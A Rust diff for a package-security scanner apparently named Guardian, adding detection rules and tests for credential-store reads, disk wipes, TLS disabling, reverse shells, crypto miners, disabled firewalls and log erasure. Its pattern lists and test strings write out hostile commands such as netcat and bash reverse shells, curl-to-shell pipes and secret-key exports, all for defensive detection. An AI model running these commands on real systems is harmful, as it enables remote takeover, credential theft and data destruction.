@@ -8,6 +8,10 @@ use std::path::Path;
 
 use crate::report::Severity;
 
+pub mod addressed;
+pub mod hidden;
+pub mod hosts;
+
 #[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
 pub enum RuleId {
     DownloadAndExecute,
@@ -31,6 +35,16 @@ pub enum RuleId {
     UnknownKernelModule,
     UnknownPrivilegedFile,
     NetworkListener,
+    ReviewerInstruction,
+    ReorderedText,
+    InvisibleText,
+    HiddenCharacter,
+    LookalikeHost,
+    DataDropHost,
+    RemoteShell,
+    CryptoMiner,
+    ProtectionDisabled,
+    TraceRemoval,
 }
 
 /// How a rule decides whether a lowercased line matches.
@@ -62,6 +76,25 @@ const CREDENTIAL_FILES: &[&str] = &[
     "/etc/shadow",
     "login data",
     "cookies.sqlite",
+    // Credential stores of common tools and browsers, and wallet files.
+    // `.gnupg/` (with the slash) is above; the bare directory name is left
+    // out, since gpg's own tooling mentions it constantly.
+    ".config/gh/hosts.yml",
+    ".docker/config.json",
+    ".kube/config",
+    ".config/gcloud",
+    ".cargo/credentials",
+    ".local/share/keyrings",
+    ".config/solana/id.json",
+    ".electrum/wallets",
+    ".ethereum/keystore",
+    ".bitcoin/wallet",
+    "/proc/self/environ",
+    // Commands that read a secret out of a store or the clipboard.
+    "secret-tool lookup",
+    "pass show",
+    "gpg --export-secret-keys",
+    "security find-generic-password",
 ];
 
 const ENCODED_PIPES: &[&str] = &[
@@ -80,6 +113,11 @@ const DESTRUCTIVE_COMMANDS: &[&str] = &[
     "wipefs --all",
     "blkdiscard /dev/",
     "find / -delete",
+    "cryptsetup luksformat",
+    "cryptsetup erase",
+    "cryptsetup lukserase",
+    "sgdisk --zap-all",
+    "sgdisk -z",
 ];
 
 const PERSISTENCE_PATHS: &[&str] = &[
@@ -150,18 +188,8 @@ const PRIVILEGE_ESCALATION: &[&str] = &[
     "chown root",
 ];
 
-const DISABLED_TLS: &[&str] = &[
-    "--insecure",
-    "--no-check-certificate",
-    "insecureskipverify: true",
-    "rejectunauthorized: false",
-    "node_tls_reject_unauthorized=0",
-    "verify=false",
-    "cert_none",
-];
-
 impl RuleId {
-    pub const ALL: [Self; 21] = [
+    pub const ALL: [Self; 31] = [
         Self::DownloadAndExecute,
         Self::EncodedCommandExecution,
         Self::CredentialFileAccess,
@@ -183,6 +211,16 @@ impl RuleId {
         Self::UnknownKernelModule,
         Self::UnknownPrivilegedFile,
         Self::NetworkListener,
+        Self::ReviewerInstruction,
+        Self::ReorderedText,
+        Self::InvisibleText,
+        Self::HiddenCharacter,
+        Self::LookalikeHost,
+        Self::DataDropHost,
+        Self::RemoteShell,
+        Self::CryptoMiner,
+        Self::ProtectionDisabled,
+        Self::TraceRemoval,
     ];
 
     pub fn from_name(name: &str) -> Option<Self> {
@@ -212,6 +250,16 @@ impl RuleId {
             Self::UnknownKernelModule => "unknown-kernel-module",
             Self::UnknownPrivilegedFile => "unknown-privileged-file",
             Self::NetworkListener => "network-listener",
+            Self::ReviewerInstruction => "text-addressed-to-reviewer",
+            Self::ReorderedText => "reordered-text",
+            Self::InvisibleText => "invisible-text",
+            Self::HiddenCharacter => "hidden-character",
+            Self::LookalikeHost => "lookalike-host",
+            Self::DataDropHost => "data-drop-host",
+            Self::RemoteShell => "remote-shell",
+            Self::CryptoMiner => "crypto-miner",
+            Self::ProtectionDisabled => "protection-disabled",
+            Self::TraceRemoval => "trace-removal",
         }
     }
 
@@ -225,7 +273,13 @@ impl RuleId {
             | Self::HiddenProgram
             | Self::PreloadedLibrary
             | Self::UnknownKernelModule
-            | Self::UnknownPrivilegedFile => Severity::High,
+            | Self::UnknownPrivilegedFile
+            | Self::ReviewerInstruction
+            | Self::ReorderedText
+            | Self::InvisibleText
+            | Self::RemoteShell
+            | Self::CryptoMiner
+            | Self::ProtectionDisabled => Severity::High,
             Self::NetworkListener => Severity::Low,
             Self::CredentialFileAccess
             | Self::PersistenceModification
@@ -237,7 +291,11 @@ impl RuleId {
             | Self::GitConfigCommand
             | Self::SshCommand
             | Self::RunningFromTemp
-            | Self::KeyboardReader => Severity::Medium,
+            | Self::KeyboardReader
+            | Self::HiddenCharacter
+            | Self::LookalikeHost
+            | Self::DataDropHost
+            | Self::TraceRemoval => Severity::Medium,
         }
     }
 
@@ -302,6 +360,36 @@ impl RuleId {
             Self::NetworkListener => {
                 "An interpreter (Python, a shell, Node) listens on the network, with no script on disk to look at."
             }
+            Self::ReviewerInstruction => {
+                "Text addressed to a reviewer or an AI model, telling it what to conclude; software has no reason to carry it."
+            }
+            Self::ReorderedText => {
+                "Holds bidirectional control characters: the text is shown in another order than it is read by a compiler, a shell or the AI review."
+            }
+            Self::InvisibleText => {
+                "Holds Unicode tag characters: text no person sees, which an AI model reads as instructions."
+            }
+            Self::HiddenCharacter => {
+                "An invisible character sits inside a name, a command or a path: it is not the name it reads as, to a person or to the AI review."
+            }
+            Self::LookalikeHost => {
+                "A host name mixes alphabets or is written in punycode, so it can read as another name than the one requested."
+            }
+            Self::DataDropHost => {
+                "Sends to or fetches from a host commonly used to deliver or receive stolen data (a paste site, a chat webhook, a tunnel, a link shortener)."
+            }
+            Self::RemoteShell => {
+                "Connects a shell to the network: someone elsewhere types the commands (a reverse or bind shell)."
+            }
+            Self::CryptoMiner => {
+                "Names a cryptocurrency miner, a mining pool or a mining protocol."
+            }
+            Self::ProtectionDisabled => {
+                "Turns off a protection of this system: a firewall, a security service, or Guardian's own gates."
+            }
+            Self::TraceRemoval => {
+                "Erases shell history or system logs, which is how traces of other commands are removed."
+            }
         }
     }
 
@@ -326,8 +414,18 @@ impl RuleId {
             | Self::KeyboardReader
             | Self::UnknownKernelModule
             | Self::UnknownPrivilegedFile
-            | Self::NetworkListener => Matcher::Reported,
-            Self::DisabledTlsVerification => Matcher::Patterns(DISABLED_TLS),
+            | Self::NetworkListener
+            | Self::ReviewerInstruction
+            | Self::ReorderedText
+            | Self::InvisibleText
+            | Self::HiddenCharacter
+            | Self::LookalikeHost
+            | Self::DataDropHost => Matcher::Reported,
+            Self::DisabledTlsVerification => Matcher::Custom(disables_tls_verification),
+            Self::RemoteShell => Matcher::Custom(is_remote_shell),
+            Self::CryptoMiner => Matcher::Custom(is_crypto_mining),
+            Self::ProtectionDisabled => Matcher::Custom(disables_protection),
+            Self::TraceRemoval => Matcher::Custom(removes_traces),
         }
     }
 
@@ -343,7 +441,11 @@ impl RuleId {
             | Self::PrivilegeEscalation
             | Self::CleartextNetworkRequest
             | Self::DirectIpNetworkRequest
-            | Self::DisabledTlsVerification => true,
+            | Self::DisabledTlsVerification
+            | Self::LookalikeHost
+            | Self::DataDropHost
+            | Self::ProtectionDisabled
+            | Self::TraceRemoval => true,
             Self::DownloadAndExecute
             | Self::EncodedCommandExecution
             | Self::DestructiveSystemOperation
@@ -358,7 +460,13 @@ impl RuleId {
             | Self::KeyboardReader
             | Self::UnknownKernelModule
             | Self::UnknownPrivilegedFile
-            | Self::NetworkListener => false,
+            | Self::NetworkListener
+            | Self::ReviewerInstruction
+            | Self::ReorderedText
+            | Self::InvisibleText
+            | Self::HiddenCharacter
+            | Self::RemoteShell
+            | Self::CryptoMiner => false,
         }
     }
 
@@ -814,9 +922,72 @@ fn runs_fetched_text(line: &str) -> bool {
                 .any(|runner| contains_pattern(line, runner)))
 }
 
+/// Shells that read commands from standard input.
+const PIPE_SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "ash", "fish"];
+
+/// Other interpreters that run what is piped into them. They double as
+/// ordinary words in a regex alternation (`(curl|perl|wget)`), so a pipe
+/// into one counts only when the pipe has whitespace beside it, as a real
+/// pipeline does and an alternation does not.
+const PIPE_INTERPRETERS: &[&str] = &["python", "perl", "ruby", "node", "php", "lua"];
+
+/// Wrappers that run the command after them without changing what it is, so
+/// `| timeout 5 sh` still reads the pipe into a shell.
+fn skip_pipe_wrappers<'a>(words: &mut impl Iterator<Item = &'a str>) -> Option<&'a str> {
+    let mut word = words.next()?;
+    loop {
+        let bare = word.trim_start_matches(['(', '{', '"', '\'']);
+        match bare {
+            "sudo" | "doas" | "run0" | "env" | "command" | "exec" | "nice" | "nohup" | "setsid"
+            | "stdbuf" | "ionice" | "chrt" | "time" => word = words.next()?,
+            // `timeout 5s cmd`, `timeout --signal=9 10 cmd`.
+            "timeout" => {
+                word = words.next()?;
+                while word.starts_with('-') {
+                    word = words.next()?;
+                }
+                word = words.next()?;
+            }
+            // `env VAR=x cmd`, an inline assignment before the program.
+            _ if bare.contains('=') && !bare.starts_with(['/', '.', '$']) => word = words.next()?,
+            _ if bare.starts_with('-') => word = words.next()?,
+            // A lone grouping token: `| { sh; }`, `| ( sh )`.
+            _ if bare.is_empty() => word = words.next()?,
+            _ => return Some(word),
+        }
+    }
+}
+
+/// Whether the program word of a pipeline segment reads and runs its input:
+/// a shell or another interpreter, `source`/`.`, a `$SHELL` variable, or
+/// `busybox sh`.
+fn consumes_pipe<'a>(word: &str, mut rest: impl Iterator<Item = &'a str>, spaced: bool) -> bool {
+    let cleaned = word.trim_matches(['(', '{', ')', '}', ';', '&', '"', '\'', '`', ' ']);
+    let program = program_name(cleaned);
+    // `source /dev/stdin`, `. /dev/stdin`.
+    if matches!(program, "source" | ".") {
+        return rest.any(|argument| argument.contains("/dev/stdin"));
+    }
+    // A shell kept in a variable (`$SHELL`), expanded or not.
+    if matches!(cleaned, "$shell" | "${shell}" | "$0") {
+        return true;
+    }
+    if program == "busybox" {
+        return rest
+            .next()
+            .is_some_and(|next| matches!(next, "sh" | "ash" | "bash"));
+    }
+    let unversioned =
+        program.trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
+    [program, unversioned].iter().any(|name| {
+        !name.is_empty()
+            && (PIPE_SHELLS.contains(name) || (spaced && PIPE_INTERPRETERS.contains(name)))
+    })
+}
+
 /// Whether a pipeline segment for which `source` holds is followed, later in
-/// the pipeline, by a shell reading it: `| sh`, `| sudo bash`, `|/bin/sh`,
-/// `| env bash`.
+/// the pipeline, by a command reading it: `| sh`, `| sudo bash`, `|/bin/sh`,
+/// `| timeout 5 python`, `| { bash; }`, `| xargs sh -c`.
 fn pipes_into_shell(line: &str, source: impl Fn(&str) -> bool) -> bool {
     // `a || b` runs b instead of a, not on its output.
     let line = line.replace("||", ";");
@@ -824,24 +995,23 @@ fn pipes_into_shell(line: &str, source: impl Fn(&str) -> bool) -> bool {
     let Some(first) = segments.iter().position(|segment| source(segment)) else {
         return false;
     };
-    segments[first + 1..].iter().any(|command| {
-        let mut words = command.split_whitespace();
-        let mut word = words.next().unwrap_or_default();
-        while matches!(word, "sudo" | "doas" | "run0" | "env" | "command" | "exec")
-            || word.starts_with('-')
-        {
-            word = words.next().unwrap_or_default();
+    (first + 1..segments.len()).any(|index| {
+        // A real pipe has whitespace on a side; a regex alternation
+        // (`a|perl|b`) does not.
+        let spaced = segments[index - 1].ends_with(char::is_whitespace)
+            || segments[index].starts_with(char::is_whitespace);
+        let mut words = segments[index].split_whitespace();
+        let Some(word) = skip_pipe_wrappers(&mut words) else {
+            return false;
+        };
+        // `xargs sh -c '…'`: xargs hands the input to the shell.
+        if program_name(word.trim_start_matches(['(', '{'])) == "xargs" {
+            let mut rest = words.skip_while(|argument| argument.starts_with('-'));
+            return rest
+                .next()
+                .is_some_and(|program| consumes_pipe(program, rest, spaced));
         }
-        let program = word
-            .trim_start_matches(['(', '"', '\''])
-            .rsplit('/')
-            .next()
-            .unwrap_or_default();
-        ["sh", "bash", "zsh", "dash"].iter().any(|shell| {
-            program.strip_prefix(shell).is_some_and(|rest| {
-                rest.is_empty() || rest.starts_with([')', '`', ';', '&', '"', '\''])
-            })
-        })
+        consumes_pipe(word, words, spaced)
     })
 }
 
@@ -1135,6 +1305,250 @@ pub fn looks_like_credential_exfiltration(line: &str) -> bool {
     reads_secret_variable || reads_sensitive_file
 }
 
+/// Settings that switch off TLS certificate checking, by any of the common
+/// tools. Each is distinctive enough to match as plain text.
+const DISABLED_TLS_PATTERNS: &[&str] = &[
+    "--no-check-certificate",
+    "insecureskipverify: true",
+    "insecureskipverify:true",
+    "rejectunauthorized: false",
+    "rejectunauthorized:false",
+    "node_tls_reject_unauthorized=0",
+    "verify=false",
+    "cert_none",
+    "ssl._create_unverified_context",
+    "_create_unverified_https_context",
+    "git_ssl_no_verify=",
+    "pythonhttpsverify=0",
+    "--proxy-insecure",
+    "stricthostkeychecking=no",
+    "strict-ssl=false",
+    "strict-ssl false",
+    "--trusted-host",
+    "curl_sslverify_none",
+];
+
+/// Whether a short-flag cluster of `program` carries the flag letter
+/// `flag`: `-k`, `-sk`, `-fsSLk`, but not `--key` nor a flag of another
+/// command on the line. `program` is matched without its path.
+fn program_short_flag(line: &str, program: &str, flag: char) -> bool {
+    let mut running = false;
+    for word in shell_words(line).iter().map(|word| unquoted(word)) {
+        match word.as_str() {
+            ";" | "|" | "&&" | "||" | "&" => running = false,
+            _ if matches!(
+                word.as_str(),
+                "sudo" | "doas" | "run0" | "env" | "command" | "exec"
+            ) => {}
+            _ if word.starts_with("--") => {}
+            // A short-flag cluster of the program now running.
+            _ if running && word.starts_with('-') => {
+                if word[1..]
+                    .chars()
+                    .all(|character| character.is_ascii_alphabetic())
+                    && word[1..].contains(flag)
+                {
+                    return true;
+                }
+            }
+            _ if word.starts_with('-') => {}
+            _ => running = program_name(&word) == program,
+        }
+    }
+    false
+}
+
+/// Whether a command named in `programs` is on the line with one of
+/// `exact_flags` among its own arguments (or, with an empty `exact_flags`,
+/// simply present as a command). Arguments stop at a command separator, so
+/// a flag of a later command does not count.
+fn command_has_flag(line: &str, programs: &[&str], exact_flags: &[&str]) -> bool {
+    let words: Vec<String> = shell_words(line)
+        .iter()
+        .map(|word| unquoted(word))
+        .collect();
+    let mut index = 0;
+    while index < words.len() {
+        if programs.contains(&program_name(&words[index])) {
+            if exact_flags.is_empty() {
+                return true;
+            }
+            for argument in &words[index + 1..] {
+                if matches!(argument.as_str(), ";" | "|" | "&&" | "||" | "&") {
+                    break;
+                }
+                if exact_flags.contains(&argument.as_str()) {
+                    return true;
+                }
+            }
+        }
+        index += 1;
+    }
+    false
+}
+
+fn disables_tls_verification(line: &str) -> bool {
+    if contains_any(line, DISABLED_TLS_PATTERNS) {
+        return true;
+    }
+    // `--insecure` is curl's and others'; a bare `-k` is only curl's.
+    if contains_pattern(line, "--insecure") {
+        return true;
+    }
+    // git's own switch, written as a config key either way round.
+    let git_off = [
+        "http.sslverify false",
+        "http.sslverify=false",
+        "sslverify=false",
+    ]
+    .iter()
+    .any(|pattern| line.contains(pattern));
+    if git_off && line.contains("git") {
+        return true;
+    }
+    program_short_flag(line, "curl", 'k')
+}
+
+/// A shell wired to a network connection, so the commands come from
+/// elsewhere. The plain `/dev/tcp/` form is already download-and-execute;
+/// these are the shapes that hide the socket or build it in another
+/// language.
+fn is_remote_shell(line: &str) -> bool {
+    // netcat and ncat running a program on connect: the flag must be one
+    // of the command's own, not any `-e` on the line (`echo -e`).
+    let netcat = command_has_flag(line, &["nc", "ncat"], &["-e", "-c", "--exec", "--sh-exec"]);
+    // socat giving a connection a shell.
+    let socat = command_has_flag(line, &["socat"], &[])
+        && (line.contains("exec:") || line.contains("system:"))
+        && ["sh", "bash", "/bin/", "-i"]
+            .iter()
+            .any(|word| line.contains(word));
+    // `/dev/tcp` built up through a variable: `d=/dev; sh -i >& $d/tcp/h/p`.
+    let indirect_tcp = line.contains("/tcp/")
+        && (line.contains(">&") || line.contains("0>&") || line.contains("<>"));
+    // An interpreter opening a socket and wiring a shell to it: a socket
+    // next to a terminal takeover, not a mere `import socket`.
+    let python = line.contains("socket")
+        && (line.contains("pty.spawn")
+            || line.contains("os.dup2")
+            || ((line.contains("/bin/sh") || line.contains("/bin/bash"))
+                && ["subprocess", "os.system", "popen", "os.execv"]
+                    .iter()
+                    .any(|word| line.contains(word))));
+    // The interpreter must be invoked with inline code, not merely named
+    // inside a word (`wallpaperleft` holds `perl`).
+    let perl = command_has_flag(line, &["perl"], &["-e"])
+        && (line.contains("socket") || line.contains("sockaddr"))
+        && (line.contains("exec") || line.contains("/bin/sh"));
+    let php = command_has_flag(line, &["php"], &["-r"])
+        && line.contains("fsockopen")
+        && (line.contains("exec") || line.contains("proc_open"));
+    let ruby = command_has_flag(line, &["ruby"], &["-e", "-rsocket"])
+        && (line.contains("socket") || line.contains("-rsocket"))
+        && (line.contains("exec") || line.contains("/bin/sh"));
+    let awk = line.contains("/inet/tcp/") || line.contains("/inet/udp/");
+    let piped = (line.contains("telnet") || line.contains("openssl s_client"))
+        && pipes_into_shell(line, |segment| {
+            segment.contains("telnet") || segment.contains("s_client")
+        });
+    netcat || socat || indirect_tcp || python || perl || php || ruby || awk || piped
+}
+
+/// Miners, mining pools and the stratum protocol.
+const MINING_MARKERS: &[&str] = &[
+    "stratum+tcp://",
+    "stratum+ssl://",
+    "stratum2+tcp://",
+    "xmrig",
+    "minerd",
+    "cpuminer",
+    "--donate-level",
+    "pool.minexmr.",
+    "supportxmr.com",
+    "nanopool.org",
+    "2miners.com",
+    "pool.hashvault.pro",
+    "minexmr.com",
+    "randomx",
+    "--coin monero",
+    "--cinit-algo",
+];
+
+fn is_crypto_mining(line: &str) -> bool {
+    MINING_MARKERS.iter().any(|marker| line.contains(marker))
+}
+
+/// Security services whose removal leaves the system more exposed, Guardian
+/// among them.
+const PROTECTED_SERVICES: &[&str] = &[
+    "firewalld",
+    "ufw",
+    "nftables",
+    "iptables",
+    "apparmor",
+    "auditd",
+    "clamav",
+    "omarchy-guardian",
+];
+
+fn disables_protection(line: &str) -> bool {
+    // Turning a security service off or masking it.
+    let systemctl = line.contains("systemctl")
+        && (line.contains("mask") || line.contains("disable") || line.contains("stop"))
+        && PROTECTED_SERVICES
+            .iter()
+            .any(|service| line.contains(service));
+    let ufw_off = line.contains("ufw disable") || line.contains("ufw --force disable");
+    let flush = line.contains("nft flush ruleset")
+        || program_short_flag(line, "iptables", 'f')
+        || line.contains("iptables --flush")
+        || line.contains("ip6tables --flush");
+    let selinux = line.contains("setenforce 0") || line.contains("setenforce  0");
+    let ptrace = line.replace(' ', "").contains("kernel.yama.ptrace_scope=0");
+    // Taking Guardian itself out of the way.
+    let removes_guardian = (line.contains("pacman -r") || line.contains("pacman --remove"))
+        && line.contains("omarchy-guardian");
+    let removes_hook = line.contains("/etc/pacman.d/hooks/omarchy-guardian")
+        && (line.contains("rm ") || line.contains("unlink") || line.contains("mv "));
+    let disarms_makepkg =
+        line.contains("--makepkg") && line.contains("makepkg") && line.contains("--save");
+    systemctl
+        || ufw_off
+        || flush
+        || selinux
+        || ptrace
+        || removes_guardian
+        || removes_hook
+        || disarms_makepkg
+}
+
+/// Erasing the record of what ran.
+fn removes_traces(line: &str) -> bool {
+    let history = line.contains("history -c")
+        || line.replace(' ', "").contains("histfile=/dev/null")
+        || line.contains("set +o history")
+        || line.contains("unset histfile");
+    let journal = line.contains("journalctl")
+        && (line.contains("--vacuum") || line.contains("--rotate") || line.contains("--flush"));
+    // Wiping the system logs themselves.
+    let logs = ["/var/log/", "/var/log "]
+        .iter()
+        .any(|path| line.contains(path))
+        && [
+            "rm ",
+            "rm -",
+            "shred",
+            "truncate",
+            ": >",
+            ":>",
+            "> /var/log",
+            ">/var/log",
+        ]
+        .iter()
+        .any(|verb| line.contains(verb));
+    history || journal || logs
+}
+
 /// Names of prose files, matched as a prefix followed by the end of the name
 /// or `.`, `-` or `_`: `LICENSE`, `LICENSE.txt`, `COPYING.LESSER`,
 /// `eula_text.html`.
@@ -1333,6 +1747,44 @@ impl Scheme {
 /// Literal HTTP(S) destinations in a line, reduced to scheme and host so
 /// paths, queries and credentials in URLs are never echoed.
 pub fn extract_network_destinations(line: &str) -> Vec<(Scheme, String)> {
+    let mut result: Vec<(Scheme, String)> = destinations_with_path(line)
+        .into_iter()
+        .map(|(scheme, host, _)| (scheme, host))
+        .collect();
+    result.sort();
+    result.dedup();
+    result
+}
+
+/// How a host read from a URL is classified, kept apart so the path that
+/// decides it is used but never stored (see `Report::network`).
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct HostConcern {
+    /// A host made to read as another name (mixed scripts, punycode).
+    pub lookalike: bool,
+    /// A host commonly used to drop off or pick up stolen data.
+    pub drop: bool,
+}
+
+/// Each literal HTTP(S) destination's host classified by the concerns its
+/// name and path raise, with the path itself discarded.
+pub fn host_concerns(line: &str) -> Vec<(String, HostConcern)> {
+    destinations_with_path(line)
+        .into_iter()
+        .filter_map(|(_, host, path)| {
+            let concern = HostConcern {
+                lookalike: hidden::is_lookalike_host(&host),
+                drop: hosts::is_drop_destination(&host, &path),
+            };
+            (concern.lookalike || concern.drop).then_some((host, concern))
+        })
+        .collect()
+}
+
+/// The literal HTTP(S) destinations of a line as `(scheme, host, path)`.
+/// The path (lowercased, query and fragment dropped) is for classification
+/// only and is never recorded.
+fn destinations_with_path(line: &str) -> Vec<(Scheme, String, String)> {
     let lower = line.to_ascii_lowercase();
     let mut result = Vec::new();
     let mut cursor = 0;
@@ -1373,20 +1825,29 @@ pub fn extract_network_destinations(line: &str) -> Vec<(Scheme, String)> {
             .unwrap_or(&rest[..end])
             .trim_end_matches(['.', ':', '?', '!', '\\']);
 
-        if let Some(host) = url_host(&url[prefix.len().min(url.len())..])
+        let after_scheme = &url[prefix.len().min(url.len())..];
+        if let Some(host) = url_host(after_scheme)
             && !doctype
             && !Path::new(url)
                 .extension()
                 .is_some_and(|extension| extension == "dtd" || extension == "xsd")
             && !is_identifier_uri(&lower[..start])
         {
-            result.push((scheme, host));
+            // The path is what follows the authority, up to a query or
+            // fragment: `/api/webhooks` of `host/api/webhooks?x=1`.
+            let path = after_scheme
+                .find('/')
+                .map(|at| &after_scheme[at..])
+                .unwrap_or_default()
+                .split(['?', '#'])
+                .next()
+                .unwrap_or_default()
+                .to_string();
+            result.push((scheme, host, path));
         }
         cursor = start + end.max(prefix.len());
     }
 
-    result.sort();
-    result.dedup();
     result
 }
 
@@ -1556,6 +2017,35 @@ mod tests {
         assert!(!is_download_piped_to_shell(
             "curl https://example.test/data | shellcheck -"
         ));
+        // Piped into another interpreter, behind a wrapper, or grouped.
+        for into in [
+            "curl https://x.test/i | python",
+            "curl https://x.test/i | python3 -",
+            "wget -qO- https://x.test/i | perl",
+            "curl https://x.test/i | ruby",
+            "curl https://x.test/i | node",
+            "curl https://x.test/i | php",
+            "curl https://x.test/i | lua",
+            "curl https://x.test/i | busybox sh",
+            "curl https://x.test/i | timeout 5 bash",
+            "curl https://x.test/i | nohup bash",
+            "curl https://x.test/i | { sh; }",
+            "curl https://x.test/i | ( bash )",
+            "curl https://x.test/i | xargs -0 sh -c",
+            "curl https://x.test/i | . /dev/stdin",
+            "curl https://x.test/i | sort -u | python3",
+        ] {
+            assert!(is_download_piped_to_shell(into), "{into}");
+        }
+        for into in [
+            "curl https://x.test/data | jq .",
+            "curl https://x.test/data | grep foo",
+            "curl https://x.test/data | sort | uniq",
+            "curl https://x.test/data | tee out",
+            "curl https://x.test/data | pandoc -o x.pdf",
+        ] {
+            assert!(!is_download_piped_to_shell(into), "{into}");
+        }
     }
 
     #[test]
@@ -1919,6 +2409,170 @@ mod tests {
         assert!(is_ip_host("[2001:db8::1]"));
         assert!(is_ip_host("198.51.100.8"));
         assert!(!is_ip_host("example.test"));
+    }
+
+    #[test]
+    fn more_credential_stores_and_disk_wipes_are_caught() {
+        for credential in [
+            "tar c ~/.gnupg/",
+            "cat ~/.config/gh/hosts.yml",
+            "cp ~/.docker/config.json /tmp/x",
+            "read ~/.kube/config",
+            "cat ~/.cargo/credentials",
+            "cat ~/.config/solana/id.json",
+            "secret-tool lookup service github",
+            "pass show github/token",
+            "gpg --export-secret-keys > k",
+        ] {
+            assert!(
+                rules_for(credential).contains(&RuleId::CredentialFileAccess),
+                "{credential}"
+            );
+        }
+        for destructive in [
+            "cryptsetup luksFormat /dev/sda",
+            "sgdisk --zap-all /dev/sda",
+        ] {
+            assert!(
+                rules_for(destructive).contains(&RuleId::DestructiveSystemOperation),
+                "{destructive}"
+            );
+        }
+        for safe in ["cat ~/.config/app/settings.json", "use gnupg for signing"] {
+            assert!(
+                !rules_for(safe).contains(&RuleId::CredentialFileAccess),
+                "{safe}"
+            );
+        }
+    }
+
+    #[test]
+    fn tls_verification_off_is_caught_only_for_the_right_tool() {
+        for off in [
+            "curl -k https://x.test/i",
+            "curl -sk https://x.test/i",
+            "curl -fssLk https://x.test/i",
+            "wget --no-check-certificate https://x.test/i",
+            "git -c http.sslverify=false clone https://x.test/r",
+            "git config http.sslverify false",
+            "env git_ssl_no_verify=1 git fetch",
+            "npm config set strict-ssl false",
+            "echo 'strict-ssl=false' >> .npmrc",
+            "export pythonhttpsverify=0",
+            "pip install --trusted-host pypi.org x",
+            "ssl._create_unverified_context()",
+            "curl --proxy-insecure https://x.test",
+            "ssh -o stricthostkeychecking=no host",
+            "requests.get(u, verify=false)",
+        ] {
+            assert!(
+                rules_for(off).contains(&RuleId::DisabledTlsVerification),
+                "{off}"
+            );
+        }
+        for safe in [
+            // `-k` belongs to another command, or is a long option.
+            "tar -k -xf a.tar",
+            "rm -k; curl https://x.test/i",
+            "curl --key client.key https://x.test",
+            "ssh-keygen -k",
+            "make -k check",
+            "grep -k 2 file",
+        ] {
+            assert!(
+                !rules_for(safe).contains(&RuleId::DisabledTlsVerification),
+                "{safe}"
+            );
+        }
+    }
+
+    #[test]
+    fn remote_shells_are_caught_without_firing_on_imports() {
+        for shell in [
+            "nc -e /bin/sh 10.0.0.1 4444",
+            "ncat --exec /bin/bash 10.0.0.1 4444",
+            "socat tcp:10.0.0.1:4444 exec:/bin/sh,pty,stderr",
+            "python -c 'import socket,subprocess,os; s=socket.socket(); os.dup2(s.fileno(),0)'",
+            "python3 -c \"import pty; pty.spawn('/bin/sh')\" # with socket",
+            "perl -e 'use Socket; exec \"/bin/sh -i\";'",
+            "php -r '$s=fsockopen($ip,$p); exec(\"/bin/sh -i\");'",
+            "ruby -rsocket -e 'exec \"/bin/sh\"'",
+            "awk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\"}'",
+            "d=/dev; bash -i >& $d/tcp/10.0.0.1/4444 0>&1",
+        ] {
+            assert!(rules_for(shell).contains(&RuleId::RemoteShell), "{shell}");
+        }
+        for safe in [
+            "import os, sys, re, socket, subprocess, time",
+            "echo -e \"\\e[31mCould not create file\\e[0m\"",
+            "nc -z localhost 22",
+            "ncat --send-only localhost 80 < file",
+            "the function spawns a subprocess and opens a socket",
+            "s_client_test()",
+        ] {
+            assert!(!rules_for(safe).contains(&RuleId::RemoteShell), "{safe}");
+        }
+    }
+
+    #[test]
+    fn miners_and_disabled_protections_are_caught() {
+        for miner in [
+            "./xmrig -o pool.minexmr.com:4444",
+            "curl -o m https://x/minerd",
+            "x --donate-level 1 -o stratum+tcp://pool:3333",
+            "pool=stratum+ssl://supportxmr.com:443",
+        ] {
+            assert!(rules_for(miner).contains(&RuleId::CryptoMiner), "{miner}");
+        }
+        for off in [
+            "systemctl mask firewalld",
+            "sudo systemctl disable --now apparmor",
+            "ufw disable",
+            "setenforce 0",
+            "sysctl -w kernel.yama.ptrace_scope=0",
+            "nft flush ruleset",
+            "iptables -F",
+            "pacman -R omarchy-guardian",
+            "rm /etc/pacman.d/hooks/omarchy-guardian.hook",
+            "yay --makepkg /usr/bin/makepkg --save",
+        ] {
+            assert!(
+                rules_for(off).contains(&RuleId::ProtectionDisabled),
+                "{off}"
+            );
+        }
+        for safe in [
+            "die \"UFW is disabled or you are not root\"",
+            "systemctl enable firewalld",
+            "echo 'run: ufw enable to turn it on'",
+            "iptables -L -n",
+            "pacman -S omarchy-guardian",
+        ] {
+            assert!(
+                !rules_for(safe).contains(&RuleId::ProtectionDisabled),
+                "{safe}"
+            );
+        }
+    }
+
+    #[test]
+    fn erasing_history_and_logs_is_caught() {
+        for trace in [
+            "history -c",
+            "export HISTFILE=/dev/null",
+            "journalctl --vacuum-time=1s",
+            "rm -rf /var/log/*",
+            "shred /var/log/auth.log",
+        ] {
+            assert!(rules_for(trace).contains(&RuleId::TraceRemoval), "{trace}");
+        }
+        for safe in [
+            "git log --oneline",
+            "tail -f /var/log/pacman.log",
+            "echo 'history is kept in ~/.bash_history'",
+        ] {
+            assert!(!rules_for(safe).contains(&RuleId::TraceRemoval), "{safe}");
+        }
     }
 
     #[test]
